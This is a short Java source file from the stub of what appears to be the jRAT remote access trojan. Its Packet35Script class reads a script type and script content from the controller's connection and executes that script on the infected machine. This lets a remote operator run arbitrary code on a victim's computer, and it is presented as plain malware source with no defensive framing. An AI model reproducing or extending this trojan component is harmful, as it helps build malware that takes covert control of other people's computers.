package se.jrat.stub.packets.incoming;

import se.jrat.common.script.Script;
import se.jrat.stub.Connection;

public class Packet35Script extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String type = Connection.readLine();
		String content = Connection.readLine();
		
		Script script = Script.getScript(type);
		script.setContent(content);
		script.perform();
	}

}
